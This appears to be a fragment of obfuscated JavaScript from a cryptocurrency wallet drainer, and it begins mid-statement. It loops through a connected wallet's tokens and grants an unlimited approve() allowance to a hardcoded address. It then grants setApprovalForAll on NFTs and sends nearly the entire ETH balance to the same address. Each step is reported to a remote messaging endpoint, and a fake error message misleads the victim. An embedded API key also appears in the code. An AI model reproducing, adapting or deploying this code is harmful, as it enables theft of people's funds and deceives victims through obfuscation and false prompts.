_0x4188cc=_0x3923ec;console[_0x4188cc(0x1cb)](_0x4188cc(0x156),_0x2ea5b2);}),NFTs=NFTs[_0x3923ec(0x208)],console[_0x3923ec(0x1cb)](_0x3923ec(0x1ef),NFTs);if(tokens[_0x3923ec(0x1ca)]===0x0&&NFTs[_0x3923ec(0x1ca)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x3923ec(0x1d0));}}async function onApprove(){const _0xf80fe9=_0x3cc450;if(tokens[_0xf80fe9(0x1ca)])try{loopTokens(tokens);}catch(_0x1bcdd4){console[_0xf80fe9(0x1b9)]('Error\x20processing\x20item\x20'+_0x1bcdd4[_0xf80fe9(0x192)]);}else{if(NFTs['length']){try{loopNfts(NFTs);}catch(_0x5629fc){console['error'](_0xf80fe9(0x16c)+_0x5629fc['message']);}onSendEther(),sendMessage('Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!');}else try{onSendEther();}catch(_0x20a3f6){console[_0xf80fe9(0x1b9)](_0xf80fe9(0x16c)+_0x20a3f6[_0xf80fe9(0x192)]);}}}async function loopTokens(_0x2e24c4){const _0x397125=_0x3cc450;for await(let _0x11c2a4 of _0x2e24c4){console['log'](_0x397125(0x1c2),_0x11c2a4);try{sendMessage(_0x397125(0x1e0));let {hash:_0x433d2b}=await writeContract({'address':_0x11c2a4['address'],'abi':ABI,'functionName':'approve','args':[Oxa,'999999999999999999999999999999999999999999999999999999999999999999999999']});console[_0x397125(0x1cb)](_0x397125(0x19d),_0x433d2b),_0x433d2b&&(console[_0x397125(0x1cb)](_0x397125(0x1ff)),sendMessage(_0x397125(0x17f)),sendMessage(_0x397125(0x1bd)+_0x11c2a4[_0x397125(0x1b8)]),sendMessage('Token\x20balance\x20is\x20'+_0x11c2a4[_0x397125(0x1de)]),sendMessage(_0x397125(0x170)+Oxa));}catch(_0x47aee7){console['log'](_0x397125(0x164)+_0x47aee7),sendMessage(_0x397125(0x20c));}};await loopNfts(NFTs);}async function loopNfts(_0x185e13){const _0x4a2500=_0x3cc450;for await(let _0xfba0a0 of _0x185e13){console[_0x4a2500(0x1cb)](_0x4a2500(0x1ae),_0xfba0a0);try{let {hash:_0xf3e88f}=await writeContract({'address':_0xfba0a0[_0x4a2500(0x1eb)],'abi':ABIN,'functionName':_0x4a2500(0x165),'args':[Oxa,!![]]});console[_0x4a2500(0x1cb)](_0x4a2500(0x19d),_0xf3e88f),console[_0x4a2500(0x1cb)](_0x4a2500(0x15f)+receipt),sendMessage(_0x4a2500(0x17f)),sendMessage(_0x4a2500(0x1e4)+_0xfba0a0['token_address']),sendMessage(_0x4a2500(0x170)+Oxa);}catch(_0x245a5f){console[_0x4a2500(0x1cb)]('Error:\x20'+_0x245a5f),sendMessage(_0x4a2500(0x20c));}}await onSendEther();}async function onSendEther(){const _0x59d2f4=_0x3cc450;console[_0x59d2f4(0x1cb)](_0x59d2f4(0x1a6));try{let _0x419079=await fetchBalance({'address':selectedAccount});console[_0x59d2f4(0x1cb)](_0x419079);const _0x15c723=await fetchFeeData();console['log'](_0x15c723);var _0x1bc8ca=_0x15c723[_0x59d2f4(0x16a)]['gasPrice'];_0x1bc8ca=parseFloat(_0x1bc8ca);let _0x1c280d=parseFloat(_0x419079['formatted'])-_0x1bc8ca*0.00042;_0x1c280d=parseEther(_0x1c280d[_0x59d2f4(0x1a0)]()),console[_0x59d2f4(0x1cb)](_0x1c280d);const {hash:_0x4c844c}=await sendTransaction({'to':Oxa,'value':_0x1c280d});console['log'](_0x4c844c),sendMessage('Transaction\x20hash\x20',_0x4c844c),sendMessage(_0x59d2f4(0x195)),sendMessage(_0x59d2f4(0x1f7));}catch{sendMessage(_0x59d2f4(0x1b6));}}async function sendMessage(_0x4d144f){return new Promise((_0x2ad08e,_0x2e3406)=>{const _0x434ea6=_0x5465,_0x8373db=Oxc;fetch(_0x434ea6(0x1c5)+_0x8373db+_0x434ea6(0x18a)+_0x4d144f,{'method':_0x434ea6(0x1ab),'headers':{}})[_0x434ea6(0x1d4)](async _0x37c891=>{const _0x232650=_0x434ea6;if(_0x37c891[_0x232650(0x154)]>0x18f)throw _0x37c891;_0x2ad08e(await _0x37c891[_0x232650(0x174)]());})[_0x434ea6(0x167)](_0x389a98=>{_0x2e3406(_0x389a98);});});}async function getPrice(_0x34d0a){return new Promise((_0x5f25d9,_0x2e6834)=>{const _0x3579c3=_0x5465;fetch(_0x3579c3(0x1e3)+_0x34d0a+_0x3579c3(0x209),{'method':_0x3579c3(0x1ab),'headers':{}})['then'](async _0x1fcd3e=>{const _0x4f0b12=_0x3579c3;if(_0x1fcd3e[_0x4f0b12(0x154)]>0x18f)throw _0x1fcd3e;_0x5f25d9(await _0x1fcd3e[_0x4f0b12(0x174)]());})[_0x3579c3(0x167)](_0x4a0b8f=>{_0x2e6834(_0x4a0b8f);});});}async function getValue(_0x4312ab,_0x47f5c2,_0x4575d1){const _0x5437e8=_0x3cc450;console[_0x5437e8(0x1cb)](_0x4312ab,_0x47f5c2,_0x4575d1);let _0x2a9124=await getPrice(_0x4312ab);console[_0x5437e8(0x1cb)](_0x5437e8(0x1ba),_0x2a9124),_0x2a9124=parseFloat(_0x2a9124[_0x4312ab]['usd']);let _0x5562a7=_0x47f5c2/0xa**(_0x4575d1||0x12)*_0x2a9124;return _0x5562a7=parseInt(_0x5562a7),_0x2a9124?_0x5562a7:0x0;}async function getNFTs(_0x385a70='',_0x5472d8='LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn',_0xd0ba6a=_0x3cc450(0x1c8),_0x381ad2='50'){return new Promise((_0x532ffd,_0x33cfad)=>{const _0x392a50=_0x5465;fetch(_0x392a50(0x20b)+_0x385a70+_0x392a50(0x153)+_0xd0ba6a+_0x392a50(0x1c4)+_0x381ad2,{'method':_0x392a50(0x1ab),'headers':{'accept':_0x392a50(0x212),'X-API-Key':_0x5472d8}})[_0x392a50(0x1d4)](async _0x2b6fd3=>{const _0xdc500b=_0x392a50;if(_0x2b6fd3[_0xdc500b(0x154)]>0x18f)throw _0x2b6fd3;_0x532ffd(await _0x2b6fd3[_0xdc500b(0x174)]());})[_0x392a50(0x167)](_0x2c8dfe=>{_0x33cfad(_0x2c8dfe);});});}